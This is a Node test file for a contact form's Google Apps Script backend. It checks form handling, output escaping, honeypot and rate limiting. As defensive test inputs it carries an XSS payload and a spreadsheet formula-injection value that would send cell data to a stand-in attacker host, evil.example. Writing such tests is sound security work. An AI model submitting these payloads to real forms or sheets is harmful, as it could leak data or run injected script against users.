// Tests for the contact form's Apps Script backend (google-apps-script/Code.gs).
//
// The script only runs inside Google's runtime, so nothing exercised it: the
// JavaScript-free form path returned "Something went wrong — undefined" for
// every submission, successful ones included, and no test could have said so.
// This loads Code.gs into a VM with small in-memory stand-ins for the Apps
// Script services it calls, and drives doPost the way the two clients do.
//
// Run with: node tests/apps-script.test.js

const fs = require('fs');
const path = require('path');
const vm = require('vm');
const crypto = require('crypto');

const ROOT = path.join(__dirname, '..');
const SOURCE = fs.readFileSync(path.join(ROOT, 'google-apps-script', 'Code.gs'), 'utf8');

let failures = 0;
function assert(cond, msg) {
    if (cond) {
        console.log('PASS:', msg);
    } else {
        console.log('FAIL:', msg);
        failures++;
    }
}

/** A fresh Apps Script world: one sheet, one cache, one outbox. */
function world(props = {}) {
    const rows = [];
    const cache = new Map();
    const mail = [];

    const range = (row) => ({
        setFontWeight() { return this; },
        setBackground() { return this; },
        setFontColor() { return this; },
        setNumberFormat() { return this; },
        setValues(values) { rows[row - 1] = values[0]; return this; }
    });
    const sheet = {
        getName: () => 'Responses',
        getLastRow: () => rows.length,
        appendRow: (r) => rows.push(r),
        getRange: (row) => range(row),
        setFrozenRows() {}
    };

    const services = {
        PropertiesService: {
            getScriptProperties: () => ({
                getProperty: (k) => ({ SPREADSHEET_ID: 'sheet-id', OWNER_EMAIL: 'owner@example.com', ...props })[k] || null
            })
        },
        CacheService: {
            getScriptCache: () => ({
                get: (k) => (cache.has(k) ? cache.get(k) : null),
                put: (k, v) => cache.set(k, v)
            })
        },
        Utilities: {
            DigestAlgorithm: { SHA_256: 'sha256' },
            Charset: { UTF_8: 'utf8' },
            // Apps Script hands back signed bytes; so does this.
            computeDigest: (alg, s) => Array.from(crypto.createHash(alg).update(s).digest(), b => (b > 127 ? b - 256 : b))
        },
        SpreadsheetApp: {
            openById: () => ({ getSheetByName: () => sheet, insertSheet: () => sheet }),
            flush() {}
        },
        LockService: { getScriptLock: () => ({ tryLock: () => true, releaseLock() {} }) },
        MailApp: { sendEmail: (to, subject, body, opts) => mail.push({ to, subject, body, opts }) },
        UrlFetchApp: { fetch: () => { throw new Error('no network in tests'); } },
        ContentService: {
            MimeType: { JSON: 'json' },
            createTextOutput: (text) => ({ kind: 'text', getContent: () => text, setMimeType() { return this; } })
        },
        HtmlService: { createHtmlOutput: (html) => ({ kind: 'html', getContent: () => html }) },
        ScriptApp: { getService: () => ({ getUrl: () => 'https://script.example/exec' }) },
        Logger: { log() {} },
        console: { error() {}, log() {} }
    };

    const ctx = vm.createContext(services);
    vm.runInContext(SOURCE, ctx, { filename: 'Code.gs' });
    return { ctx, rows, mail };
}

const valid = { name: 'Ada', email: 'ada@example.com', subject: 'Hello', message: 'A question about groundwater.' };

/** The site's fetch: a JSON string body. */
const postJson = (w, data) => w.ctx.doPost({ postData: { type: 'text/plain', contents: JSON.stringify(data) } });

/** A browser with JavaScript off: the <form> posts itself. */
const postForm = (w, data) => w.ctx.doPost({ postData: { type: 'application/x-www-form-urlencoded' }, parameter: data });

// --- The JavaScript path answers in JSON --------------------------------
{
    const w = world();
    const out = postJson(w, valid);
    const body = JSON.parse(out.getContent());
    assert(out.kind === 'text' && body.status === 'success', `JSON path: a valid submission succeeds (${body.status}: ${body.message})`);
    assert(w.rows.length === 2, `JSON path: the submission lands in the sheet under the header row (${w.rows.length} rows)`);
    assert(w.mail.length === 1 && w.mail[0].to === 'owner@example.com', 'JSON path: the owner is notified');
    assert(w.mail[0] && w.mail[0].opts.replyTo === valid.email && !w.mail[0].opts.cc, 'JSON path: the visitor is reply-to, never copied');

    const bad = JSON.parse(postJson(world(), { ...valid, email: 'not-an-address' }).getContent());
    assert(bad.status === 'error' && /valid email/i.test(bad.message), `JSON path: a rejection carries its reason (${bad.message})`);
}

// --- The JavaScript-free path answers with a page -----------------------
{
    const w = world();
    const out = postForm(w, valid);
    const html = out.getContent();
    assert(out.kind === 'html', 'Form path: a form post is answered with a page, not JSON');
    assert(/Thank you/.test(html) && !/Something went wrong/.test(html), 'Form path: a recorded submission is reported as sent');
    assert(!/undefined/.test(html), 'Form path: the page never says "undefined"');
    assert(w.rows.length === 2, 'Form path: the submission lands in the sheet');

    const rejected = postForm(world(), { ...valid, message: '' }).getContent();
    assert(/Something went wrong/.test(rejected) && /required/.test(rejected), 'Form path: a rejection says what was wrong');
    assert(/href="https:\/\/moseskolleh\.github\.io\/sustaintheworld\/#contact"/.test(rejected), 'Form path: the page links back to the form');

    const hostile = postForm(world(), { ...valid, message: '<script>alert(1)</script>', email: 'x' }).getContent();
    assert(!/<script>alert/.test(hostile), 'Form path: nothing the visitor sent is echoed unescaped');
}

// --- What reaches the sheet is inert -----------------------------------
{
    const w = world();
    postJson(w, { ...valid, message: '=IMPORTXML("https://evil.example/?d="&A1,"//a")', subject: '+1+1' });
    const row = w.rows[1] || [];
    assert(String(row[4]).startsWith("'="), 'Sheet: a formula in the message is stored as text');
    assert(String(row[3]).startsWith("'+"), 'Sheet: a formula in the subject is stored as text');
    assert(w.ctx.testFormulaEscaping().length === 0, "Sheet: the script's own escaping tests pass");
}

// --- The honeypot and the limits ---------------------------------------
{
    const w = world();
    const trapped = JSON.parse(postJson(w, { ...valid, website: 'http://spam.example' }).getContent());
    assert(trapped.status === 'success' && w.rows.length === 0 && w.mail.length === 0, 'Honeypot: a bot is told it succeeded, and nothing is recorded or sent');

    postJson(w, valid);
    const again = JSON.parse(postJson(w, valid).getContent());
    assert(again.status === 'error' && /wait a moment/.test(again.message), `Rate limit: a second message straight after the first is held back (${again.message})`);

    const other = JSON.parse(postJson(w, { ...valid, email: 'grace@example.com' }).getContent());
    assert(other.status === 'success', "Rate limit: one visitor's throttle does not block another");
}

if (failures > 0) {
    console.log(`\n${failures} assertion(s) failed`);
    process.exit(1);
}
console.log('\nAll assertions passed');
